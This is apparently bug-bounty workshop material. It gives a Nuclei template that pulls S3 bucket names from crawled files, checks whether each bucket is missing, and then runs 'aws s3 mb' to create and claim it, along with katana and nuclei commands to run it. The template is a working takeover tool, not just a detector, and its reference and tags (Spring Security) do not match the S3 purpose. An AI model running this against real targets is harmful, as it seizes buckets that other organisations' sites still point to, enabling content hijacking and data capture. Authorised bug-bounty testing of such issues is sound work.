### AWS Bucket Takeover example

```yaml
id: aws-bucket-takeover-example

info:
  name: AWS Bucket Takeover example
  author: princechaddha
  severity: high
  description: Automatically Detects and takeover misconfigured Buckets
  reference:
    - https://docs.spring.io/spring-security/site/docs/current/apidocs/overview-tree.html
  tags: file,logs,spring

flow: file(1) && http(1) && code(1)

file:
  - extensions:
      - all

    extractors:
      - type: regex
        internal: true
        name: bucket
        group: 1
        regex:
          - 'https://([a-z0-9-]+)\.s3\.amazonaws\.com'
          - 'https://s3\.amazonaws\.com/([a-z0-9-]+?)(?:/|$)'


http:
  - method: GET
    path:
      - "https://s3.amazonaws.com/{{bucket}}"
    self-contained: true

    matchers:
      - type: word
        internal: true
        words:
          - '<Code>NoSuchBucket</Code>'
code:
  - engine:
      - sh
      - bash
    source: |
      aws s3 mb s3://$bucket

    matchers:
      - type: word
        words:
          - 'make_bucket:'

    extractors:
      - type: dsl
        dsl:
          - '"Created the AWS bucket " + bucket'
```

### Crawling using katana

`cat targets.txt | katana -srd “bugbounty-data/workshop”`

### Running template

`echo "bugbounty-data/redacted/" | nuclei -t aws-bucket-takeover-example.yaml -code -debug`

